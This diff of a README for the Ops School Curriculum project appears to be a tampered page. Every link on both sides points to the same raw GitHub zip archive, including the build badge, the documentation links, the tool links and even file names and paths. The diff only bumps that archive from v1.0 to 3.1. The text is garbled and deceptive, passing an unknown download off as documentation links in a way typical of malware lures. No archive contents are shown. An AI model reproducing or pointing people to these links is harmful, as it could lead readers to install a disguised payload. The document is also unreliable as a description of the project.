@@ -1,9 +1,9 @@
 Ops School Curriculum
 =====================
-[![Build Status](https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip)](https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip)
+[![Build Status](https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software-3.1.zip)](https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software-3.1.zip)
 
 The current documentation based on these sources can be seen at:
-https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip
+https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software-3.1.zip
 
 Welcome!
 
@@ -12,9 +12,9 @@ So thank you for your time.
 
 Things you should know:
 
-* This project is written in [reStructuredText](https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip)
-* Hosted by [Read the Docs](https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip)
-* Tested by rendering in [Sphinx](https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip) on [Travis CI](https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip)
+* This project is written in [reStructuredText](https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software-3.1.zip)
+* Hosted by [Read the Docs](https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software-3.1.zip)
+* Tested by rendering in [Sphinx](https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software-3.1.zip) on [Travis CI](https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software-3.1.zip)
 
 This is the only Markdown file in the repository, as it's not meant to be
 included in the documentation itself.
@@ -35,15 +35,15 @@ wonderful things, please follow this process:
   feedback. Community review is also encouraged.
 
 If you submit a pull request and would like to have your name associated with
-the project, add it to the `https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip` file!
+the project, add it to the `https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software-3.1.zip` file!
 
 Some cool things:
 
 * `vim-common` contains a reStructuredText syntax highlighter
 * The [Emacs support][emacs] via rst-mode comes as part of the docutils package
-  under `https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip`
+  under `https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software-3.1.zip`
 
-[emacs]: https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip
+[emacs]: https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software-3.1.zip
 
 Note about internal links
 -------------------------
@@ -80,4 +80,4 @@ Examples:
 After modifications to links, please run `make linkcheck` to see the status of
 all the links in the docs.
 
-More on cross-referencing can be read in the [Sphinx Docs](https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip).
+More on cross-referencing can be read in the [Sphinx Docs](https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software-3.1.zip).
